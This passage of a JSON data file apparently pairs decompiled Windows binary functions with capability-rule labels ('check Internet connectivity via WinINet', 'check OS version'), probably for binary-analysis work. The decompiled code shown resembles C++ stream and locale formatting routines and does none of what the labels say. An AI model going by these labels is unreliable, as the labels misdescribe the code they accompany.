else {\n            uVar9 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar9 < uVar11) {\n            fcn.1400a3380(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar8] = 0;\n        puStack136[uVar8 + 1] = 0;\n        uStack128 = uVar11;\n        cVar5 = fcn.1400b1590(*(iVar12 + 0x10), *(iVar12 + 0x18), &puStack136);\n        if (cVar5 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar14 = piVar2 == -1;\n    fcn.1400a18b0(in_stack_00000038, &puStack104);\n    bVar13 = piVar10 != NULL && bVar14;\n    if ((piVar10 != NULL && bVar14) && (bVar14 = false,  piVar10[3] <= piVar10[2])) {\n        iVar6 = (**(*piVar10 + 0x48))(piVar10);\n        if (iVar6 == -1) {\n            piVar10 = NULL;\n        }\n        bVar14 = iVar6 == -1 && bVar13;\n    }\n    bVar13 = piVar3 == -1;\n    if (((piVar4 != NULL) && (bVar13)) && (bVar13 = false,  piVar4[3] <= piVar4[2])) {\n        iVar6 = (**(*piVar4 + 0x48))(piVar4);\n        bVar13 = iVar6 == -1;\n    }\n    if (bVar14 == bVar13) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piVar10;\n    arg1[1] = piVar2;\n    if (puStack104 != auStack88) {\n        fcn.1400b64d0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400b64d0();\n    }\n    return arg1;\n}\n",
        "token_count": 2423
    },
    "140038b2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140039255)\n// WARNING: Removing unreachable block (ram,0x000140039687)\n// WARNING: Removing unreachable block (ram,0x000140039694)\n// WARNING: Removing unreachable block (ram,0x000140038d5e)\n// WARNING: Removing unreachable block (ram,0x000140038d67)\n// WARNING: Removing unreachable block (ram,0x0001400395f8)\n// WARNING: Removing unreachable block (ram,0x000140039b91)\n// WARNING: Removing unreachable block (ram,0x000140039b9f)\n// WARNING: Removing unreachable block (ram,0x000140039ba3)\n// WARNING: Removing unreachable block (ram,0x000140039606)\n// WARNING: Removing unreachable block (ram,0x000140039613)\n// WARNING: Removing unreachable block (ram,0x000140038d78)\n// WARNING: Removing unreachable block (ram,0x000140038d82)\n// WARNING: Removing unreachable block (ram,0x000140038d90)\n// WARNING: Removing unreachable block (ram,0x000140039650)\n// WARNING: Removing unreachable block (ram,0x000140038d98)\n// WARNING: Removing unreachable block (ram,0x000140038d06)\n// WARNING: Removing unreachable block (ram,0x000140038d14)\n// WARNING: Removing unreachable block (ram,0x000140039438)\n// WARNING: Removing unreachable block (ram,0x000140038d18)\n// WARNING: Removing unreachable block (ram,0x000140038d20)\n// WARNING: Removing unreachable block (ram,0x0001400395e0)\n// WARNING: Removing unreachable block (ram,0x000140039b6f)\n// WARNING: Removing unreachable block (ram,0x000140039b80)\n// WARNING: Removing unreachable block (ram,0x000140039b88)\n// WARNING: Removing unreachable block (ram,0x000140039b8c)\n// WARNING: Removing unreachable block (ram,0x0001400395ee)\n// WARNING: Removing unreachable block (ram,0x000140038d37)\n// WARNING: Removing unreachable block (ram,0x000140038d39)\n// WARNING: Removing unreachable block (ram,0x000140038d46)\n// WARNING: Removing unreachable block (ram,0x000140038d4e)\n// WARNING: Removing unreachable block (ram,0x000140039400)\n// WARNING: Removing unreachable block (ram,0x00014003940e)\n// WARNING: Removing unreachable block (ram,0x000140039428)\n// WARNING: Removing unreachable block (ram,0x00014003942c)\n// WARNING: Removing unreachable block (ram,0x000140038d50)\n// WARNING: Removing unreachable block (ram,0x000140039660)\n// WARNING: Removing unreachable block (ram,0x00014003966e)\n// WARNING: Removing unreachable block (ram,0x000140039758)\n// WARNING: Removing unreachable block (ram,0x00014003925c)\n\nint64_t ** fcn.140038b20(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t arg3_00;\n    int64_t **ppiVar7;\n    uint64_t uVar8;\n    int64_t *arg1_00;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar10 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b36a0(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.1400261c0(0x1400fb790);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iVar12 = *piVar1;\n    if (iVar12 == 0) {\n        arg1_00 = fcn.1400b6520(0x70);\n        *(arg1_00 + 1) = 0;\n        iVar12 = *0x1401033e0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar12 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.14009a5d0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iVar12 = *piVar1;\n    }\n    uStack128 = 0;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    if (*(iVar12 + 0x20) != '\\0') {\n        fcn.1400a3070(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a3070(&puStack104, 0x20);\n    uStack140 = *(iVar12 + 0x60);\n    iStack256 = 0;\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140038cdb. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fdd6c\n            ppiVar7 = (*(*(*(&uStack140 + iStack256) * 4 + 0x1400fdd6c) + 0x1400fdd6c))();\n            return ppiVar7;\n        }\n        iVar6 = iStack256;\n        iStack256 = iStack256 + 1;\n    } while (iVar6 + 1 < 4);\n    if ((uStack96 < 2) || (uVar8 = fcn.1400298f0(&puStack104, 0x30, 0),  uVar8 == 0)) goto code_r0x00014003967d;\n    if (uVar8 == 0xffffffffffffffff) {\n        uVar8 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x00014003967d;\n        }\n        if (uVar8 == 0) goto code_r0x00014003967d;\n    }\n    uVar11 = uStack96;\n    if (uVar8 < uStack96) {\n        uVar11 = uVar8;\n    }\n    fcn.1400a3120(&puStack104, 0, uVar11);\ncode_r0x00014003967d:\n    uVar8 = uStack128;\n    if (uStack128 != 0) {\n        uVar11 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar9 = 0xf;\n        }\n        else {\n            uVar9 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar9 < uVar11) {\n            fcn.1400a3380(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar8] = 0;\n        puStack136[uVar8 + 1] = 0;\n        uStack128 = uVar11;\n        cVar5 = fcn.1400b1590(*(iVar12 + 0x10), *(iVar12 + 0x18), &puStack136);\n        if (cVar5 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar14 = piVar2 == -1;\n    fcn.1400a18b0(in_stack_00000038, &puStack104);\n    bVar13 = piVar10 != NULL && bVar14;\n    if ((piVar10 != NULL && bVar14) && (bVar14 = false,  piVar10[3] <= piVar10[2])) {\n        iVar6 = (**(*piVar10 + 0x48))(piVar10);\n        if (iVar6 == -1) {\n            piVar10 = NULL;\n        }\n        bVar14 = iVar6 == -1 && bVar13;\n    }\n    bVar13 = piVar3 == -1;\n    if (((piVar4 != NULL) && (bVar13)) && (bVar13 = false,  piVar4[3] <= piVar4[2])) {\n        iVar6 = (**(*piVar4 + 0x48))(piVar4);\n        bVar13 = iVar6 == -1;\n    }\n    if (bVar14 == bVar13) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piVar10;\n    arg1[1] = piVar2;\n    if (puStack104 != auStack88) {\n        fcn.1400b64d0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400b64d0();\n    }\n    return arg1;\n}\n",
        "token_count": 2428
    },
    "14003a2a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014003a9f5)\n// WARNING: Removing unreachable block (ram,0x00014003adbf)\n// WARNING: Removing unreachable block (ram,0x00014003adcc)\n// WARNING: Removing unreachable block (ram,0x00014003a50b)\n// WARNING: Removing unreachable block (ram,0x00014003a510)\n// WARNING: Removing unreachable block (ram,0x00014003a519)\n// WARNING: Removing unreachable block (ram,0x00014003aba6)\n// WARNING: Removing unreachable block (ram,0x00014003b356)\n// WARNING: Removing unreachable block (ram,0x00014003abb4)\n// WARNING: Removing unreachable block (ram,0x00014003abb7)\n// WARNING: Removing unreachable block (ram,0x00014003abbd)\n// WARNING: Removing unreachable block (ram,0x00014003abc1)\n// WARNING: Removing unreachable block (ram,0x00014003a51b)\n// WARNING: Removing unreachable block (ram,0x00014003a526)\n// WARNING: Removing unreachable block (ram,0x00014003afa9)\n// WARNING: Removing unreachable block (ram,0x00014003a534)\n// WARNING: Removing unreachable block (ram,0x00014003a53c)\n// WARNING: Removing unreachable block (ram,0x00014003a49a)\n// WARNING: Removing unreachable block (ram,0x00014003a4ad)\n// WARNING: Removing unreachable block (ram,0x00014003abc6)\n// WARNING: Removing unreachable block (ram,0x00014003a4b1)\n// WARNING: Removing unreachable block (ram,0x00014003a4c0)\n// WARNING: Removing unreachable block (ram,0x00014003aef8)\n// WARNING: Removing unreachable block (ram,0x00014003b21e)\n// WARNING: Removing unreachable block (ram,0x00014003af06)\n// WARNING: Removing unreachable block (ram,0x00014003af09)\n// WARNING: Removing unreachable block (ram,0x00014003af12)\n// WARNING: Removing unreachable block (ram,0x00014003af1a)\n// WARNING: Removing unreachable block (ram,0x00014003af1e)\n// WARNING: Removing unreachable block (ram,0x00014003a4d8)\n// WARNING: Removing unreachable block (ram,0x00014003a4db)\n// WARNING: Removing unreachable block (ram,0x00014003ad68)\n// WARNING: Removing unreachable block (ram,0x00014003b31b)\n// WARNING: Removing unreachable block (ram,0x00014003ad76)\n// WARNING: Removing unreachable block (ram,0x00014003ad79)\n// WARNING: Removing unreachable block (ram,0x00014003ad87)\n// WARNING: Removing unreachable block (ram,0x00014003ad8b)\n// WARNING: Removing unreachable block (ram,0x00014003ad8f)\n// WARNING: Removing unreachable block (ram,0x00014003a4f4)\n// WARNING: Removing unreachable block (ram,0x00014003a4fd)\n// WARNING: Removing unreachable block (ram,0x00014003ad98)\n// WARNING: Removing unreachable block (ram,0x00014003ada6)\n// WARNING: Removing unreachable block (ram,0x00014003ae97)\n// WARNING: Removing unreachable block (ram,0x00014003a9fd)\n\nint64_t ** fcn.14003a2a0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    char cVar7;\n    int16_t iVar8;\n    int64_t arg3_00;\n    int64_t **ppiVar9;\n    uint64_t uVar10;\n    int64_t *arg1_00;\n    uint64_t uVar11;\n    int64_t *piVar12;\n    uint64_t uVar13;\n    bool bVar14;\n    bool bVar15;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack280;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar12 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b3700(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.1400261c0(0x1400fb7a0);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iStack280 = *piVar1;\n    if (iStack280 == 0) {\n        arg1_00 = fcn.1400b6520(0x80);\n        *(arg1_00 + 1) = 0;\n        iVar6 = *0x1401033f0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar6 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.14009ae00(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iStack280 = *piVar1;\n    }\n    uStack120 = 0;\n    uStack128 = 0;\n    puStack136 = &uStack120;\n    if (*(iStack280 + 0x20) != '\\0') {\n        fcn.1400a3070(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a3070(&puStack104, 0x20);\n    iStack256 = 0;\n    uStack140 = *(iStack280 + 0x60);\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003a472. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fe110\n            ppiVar9 = (*(*(*(&uStack140 + iStack256) * 4 + 0x1400fe110) + 0x1400fe110))();\n            return ppiVar9;\n        }\n        iVar5 = iStack256;\n        iStack256 = iStack256 + 1;\n    } while (iVar5 + 1 < 4);\n    if ((uStack96 < 2) || (uVar10 = fcn.1400298f0(&puStack104, 0x30, 0),  uVar10 == 0)) goto code_r0x00014003adb5;\n    if (uVar10 == 0xffffffffffffffff) {\n        uVar10 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x00014003adb5;\n        }\n        if (uVar10 == 0) goto code_r0x00014003adb5;\n    }\n    uVar13 = uStack96;\n    if (uVar10 <= uStack96) {\n        uVar13 = uVar10;\n    }\n    fcn.1400a3120(&puStack104, 0, uVar13);\ncode_r0x00014003adb5:\n    uVar10 = uStack128;\n    if (uStack128 != 0) {\n        uVar13 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar11 = 0xf;\n        }\n        else {\n            uVar11 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar11 < uVar13) {\n            fcn.1400a3380(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar10] = 0;\n        puStack136[uVar10 + 1] = 0;\n        uStack128 = uVar13;\n        cVar7 = fcn.1400b1590(*(iStack280 + 0x10), *(iStack280 + 0x18), &puStack136);\n        if (cVar7 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar15 = piVar2 == -1;\n    fcn.1400a18b0(in_stack_00000038, &puStack104);\n    bVar14 = piVar12 != NULL;\n    if (bVar14 && bVar15) {\n        if (piVar12[2] < piVar12[3]) {\n            iVar8 = *piVar12[2];\n        }\n        else {\n            iVar8 = (**(*piVar12 + 0x48))(piVar12);\n        }\n        if (iVar8 == -1) {\n            piVar12 = NULL;\n        }\n        bVar15 = iVar8 == -1 && (bVar14 && bVar15);\n    }\n    bVar14 = piVar3 == -1;\n    if ((piVar4 != NULL) && (bVar14)) {\n        if (piVar4[2] < piVar4[3]) {\n            iVar8 = *piVar4[2];\n        }\n        else {\n            iVar8 = (**(*piVar4 + 0x48))(piVar4);\n        }\n        bVar14 = iVar8 == -1;\n    }\n    if (bVar14 == bVar15) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    arg1[1] = piVar2;\n    *arg1 = piVar12;\n    if (puStack104 != auStack88) {\n        fcn.1400b64d0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400b64d0();\n    }\n    return arg1;\n}\n",
        "token_count": 2568
    },
    "14003b5e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014003bd35)\n// WARNING: Removing unreachable block (ram,0x00014003c0ff)\n// WARNING: Removing unreachable block (ram,0x00014003c10c)\n// WARNING: Removing unreachable block (ram,0x00014003b84b)\n// WARNING: Removing unreachable block (ram,0x00014003b850)\n// WARNING: Removing unreachable block (ram,0x00014003b859)\n// WARNING: Removing unreachable block (ram,0x00014003bee6)\n// WARNING: Removing unreachable block (ram,0x00014003c696)\n// WARNING: Removing unreachable block (ram,0x00014003bef4)\n// WARNING: Removing unreachable block (ram,0x00014003bef7)\n// WARNING: Removing unreachable block (ram,0x00014003befd)\n// WARNING: Removing unreachable block (ram,0x00014003bf01)\n// WARNING: Removing unreachable block (ram,0x00014003b85b)\n// WARNING: Removing unreachable block (ram,0x00014003b866)\n// WARNING: Removing unreachable block (ram,0x00014003c2e9)\n// WARNING: Removing unreachable block (ram,0x00014003b874)\n// WARNING: Removing unreachable block (ram,0x00014003b87c)\n// WARNING: Removing unreachable block (ram,0x00014003b7da)\n// WARNING: Removing unreachable block (ram,0x00014003b7ed)\n// WARNING: Removing unreachable block (ram,0x00014003bf06)\n// WARNING: Removing unreachable block (ram,0x00014003b7f1)\n// WARNING: Removing unreachable block (ram,0x00014003b800)\n// WARNING: Removing unreachable block (ram,0x00014003c238)\n// WARNING: Removing unreachable block (ram,0x00014003c55e)\n// WARNING: Removing unreachable block (ram,0x00014003c246)\n// WARNING: Removing unreachable block (ram,0x00014003c249)\n// WARNING: Removing unreachable block (ram,0x00014003c252)\n// WARNING: Removing unreachable block (ram,0x00014003c25a)\n// WARNING: Removing unreachable block (ram,0x00014003c25e)\n// WARNING: Removing unreachable block (ram,0x00014003b818)\n// WARNING: Removing unreachable block (ram,0x00014003b81b)\n// WARNING: Removing unreachable block (ram,0x00014003c0a8)\n// WARNING: Removing unreachable block (ram,0x00014003c65b)\n// WARNING: Removing unreachable block (ram,0x00014003c0b6)\n// WARNING: Removing unreachable block (ram,0x00014003c0b9)\n// WARNING: Removing unreachable block (ram,0x00014003c0c7)\n// WARNING: Removing unreachable block (ram,0x00014003c0cb)\n// WARNING: Removing unreachable block (ram,0x00014003c0cf)\n// WARNING: Removing unreachable block (ram,0x00014003b834)\n// WARNING: Removing unreachable block (ram,0x00014003b83d)\n// WARNING: Removing unreachable block (ram,0x00014003c0d8)\n// WARNING: Removing unreachable block (ram,0x00014003c0e6)\n// WARNING: Removing unreachable block (ram,0x00014003c1d7)\n// WARNING: Removing unreachable block (ram,0x00014003bd3d)\n\nint64_t ** fcn.14003b5e0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    char cVar7;\n    int16_t iVar8;\n    int64_t arg3_00;\n    int64_t **ppiVar9;\n    uint64_t uVar10;\n    int64_t *arg1_00;\n    uint64_t uVar11;\n    int64_t *piVar12;\n    uint64_t uVar13;\n    bool bVar14;\n    bool bVar15;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack280;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar12 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b3700(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.1400261c0(0x1400fb7b0);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iStack280 = *piVar1;\n    if (iStack280 == 0) {\n        arg1_00 = fcn.1400b6520(0x80);\n        *(arg1_00 + 1) = 0;\n        iVar6 = *0x140103400;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar6 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.14009b620(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.14009d930(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iStack280 = *piVar1;\n    }\n    uStack120 = 0;\n    uStack128 = 0;\n    puStack136 = &uStack120;\n    if (*(iStack280 + 0x20) != '\\0') {\n        fcn.1400a3070(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a3070(&puStack104, 0x20);\n    iStack256 = 0;\n    uStack140 = *(iStack280 + 0x60);\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003b7b2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x1400fe0fc\n            ppiVar9 = (*(*(*(&uStack140 + iStack256) * 4 + 0x1400fe0fc) + 0x1400fe0fc))();\n            return ppiVar9;\n        }\n        iVar5 = iStack256;\n        iStack256 = iStack256 + 1;\n    } while (iVar5 + 1 < 4);\n    if ((uStack96 < 2) || (uVar10 = fcn.1400298f0(&puStack104, 0x30, 0),  uVar10 == 0)) goto code_r0x00014003c0f5;\n    if (uVar10 == 0xffffffffffffffff) {\n        uVar10 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x00014003c0f5;\n        }\n        if (uVar10 == 0) goto code_r0x00014003c0f5;\n    }\n    uVar13 = uStack96;\n    if (uVar10 <= uStack96) {\n        uVar13 = uVar10;\n    }\n    fcn.1400a3120(&puStack104, 0, uVar13);\ncode_r0x00014003c0f5:\n    uVar10 = uStack128;\n    if (uStack128 != 0) {\n        uVar13 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar11 = 0xf;\n        }\n        else {\n            uVar11 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar11 < uVar13) {\n            fcn.1400a3380(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar10] = 0;\n        puStack136[uVar10 + 1] = 0;\n        uStack128 = uVar13;\n        cVar7 = fcn.1400b1590(*(iStack280 + 0x10), *(iStack280 + 0x18), &puStack136);\n        if (cVar7 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar15 = piVar2 == -1;\n    fcn.1400a18b0(in_stack_00000038, &puStack104);\n    bVar14 = piVar12 != NULL;\n    if (bVar14 && bVar15) {\n        if (piVar12[2] < piVar12[3]) {\n            iVar8 = *piVar12[2];\n        }\n        else {\n            iVar8 = (**(*piVar12 + 0x48))(piVar12);\n        }\n        if (iVar8 == -1) {\n            piVar12 = NULL;\n        }\n        bVar15 = iVar8 == -1 && (bVar14 && bVar15);\n    }\n    bVar14 = piVar3 == -1;\n    if ((piVar4 != NULL) && (bVar14)) {\n        if (piVar4[2] < piVar4[3]) {\n            iVar8 = *piVar4[2];\n        }\n        else {\n            iVar8 = (**(*piVar4 + 0x48))(piVar4);\n        }\n        bVar14 = iVar8 == -1;\n    }\n    if (bVar14 == bVar15) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    arg1[1] = piVar2;\n    *arg1 = piVar12;\n    if (puStack104 != auStack88) {\n        fcn.1400b64d0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400b64d0();\n    }\n    return arg1;\n}\n",
        "token_count": 2588
    },
    "14003d07": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14003d070(int64_t **arg1, ulong noname_1, int64_t **arg3, uint8_t *arg4)\n\n{\n    uint8_t *arg2;\n    int64_t **ppiVar1;\n    uchar uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t arg3_00;\n    uchar *puVar7;\n    int64_t *piVar8;\n    ulong uVar9;\n    uint8_t *puVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    uchar **ppuVar14;\n    uint64_t uVar15;\n    uint32_t uVar16;\n    uint8_t *arg4_00;\n    int32_t iVar17;\n    int64_t *piVar18;\n    uchar in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack248;\n    uchar *puStack232;\n    uint8_t *puStack216;\n    uint8_t *puStack184;\n    uint uStack140;\n    uchar *puStack136;\n    uint8_t *puStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint8_t *puStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    \n    piVar3 = *arg3;\n    piVar18 = arg3[1];\n    arg4_00 = arg4;\n    iVar6 = fcn.1400b36a0(arg4 + 0xd0);\n    arg3_00 = fcn.1400261c0(0x1400fb780);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + arg3_00 * 8;\n    piVar8 = *ppiVar1;\n    if (piVar8 == NULL) {\n        piVar8 = fcn.1400b6520(0x70);\n        *(piVar8 + 1) = 0;\n        iVar4 = *0x1401033d0;\n        piVar8[2] = 0;\n        piVar8[3] = 0;\n        *piVar8 = iVar4 + 0x10;\n        *(piVar8 + 4) = 0;\n        *(piVar8 + 0x21) = 0;\n        piVar8[5] = 0;\n        piVar8[6] = 0;\n        piVar8[7] = 0;\n        piVar8[8] = 0;\n        piVar8[9] = 0;\n        piVar8[10] = 0;\n        *(piVar8 + 0xb) = 0;\n        *(piVar8 + 0x5c) = 0;\n        *(piVar8 + 0x6f) = 0;\n        fcn.140099da0(piVar8, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), piVar8, arg3_00);\n        piVar8 = *ppiVar1;\n    }\n    puVar11 = *in_stack_00000030;\n    if (*puVar11 == *(piVar8 + 100)) {\n        uStack140 = *(piVar8 + 0xc);\n        puStack232 = piVar8[9];\n        uStack248 = piVar8[10];\n        if (in_stack_00000030[1] == NULL) goto code_r0x00014003d147;\n        puVar11 = puVar11 + 1;\n    }\n    else {\n        uStack140 = *(piVar8 + 0x5c);\n        puStack232 = piVar8[7];\n        uStack248 = piVar8[8];\n    }\n    puVar10 = in_stack_00000030[1] + puVar11;\n    if (puVar10 <= puVar11) goto code_r0x00014003d147;\n    puVar13 = puVar11;\n    do {\n        if ((*(*(iVar6 + 0x30) + *puVar13 * 2) & 8) == 0) break;\n        puVar13 = puVar13 + 1;\n    } while (puVar10 != puVar13);\n    puVar13 = puVar13 + -puVar11;\n    if (puVar13 == NULL) goto code_r0x00014003d147;\n    puStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400a3070(&puStack136, puVar13 * 2);\n    iVar5 = *(piVar8 + 0xb);\n    iVar17 = puVar13 - iVar5;\n    if (iVar17 < 1) {\ncode_r0x00014003d27c:\n        puVar10 = puStack128;\n        if (iVar5 < 1) {\ncode_r0x00014003d291:\n            uVar16 = *(arg4 + 0x18) & 0xb0;\n            puStack216 = puStack128 + uStack248;\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                puStack216 = puStack216 + piVar8[6];\n            }\n            puStack96 = NULL;\n            uStack88 = 0;\n            puStack104 = &uStack88;\n            fcn.1400a3070(&puStack104, puStack216 * 2);\n            puVar11 = *(arg4 + 0x10);\n            ppuVar14 = &uStack140;\n            puStack184 = puStack96;\n            do {\n                if (*ppuVar14 < 5) {\n    // switch table (5 cases) at 0x1400fddf4\n                    switch(*ppuVar14) {\n                    case 0:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) {\ncode_r0x00014003d47a:\n                            arg4_00 = puVar11 + -puStack216;\n                            fcn.1400a1690(&puStack104, puStack184, 0, arg4_00);\n                            puStack184 = puStack96;\n                        }\n                        break;\n                    case 